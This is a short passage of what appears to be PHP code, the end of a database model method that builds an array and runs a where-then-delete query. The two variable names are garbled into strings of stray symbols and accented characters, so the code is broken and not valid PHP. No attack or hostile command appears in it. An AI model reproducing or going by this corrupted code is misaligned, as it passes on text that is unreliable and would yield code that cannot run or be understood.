array($d»—Æ©œÏ[925], 0)); return $this->where($BÀ™ïŠŒæ )->delete(); } }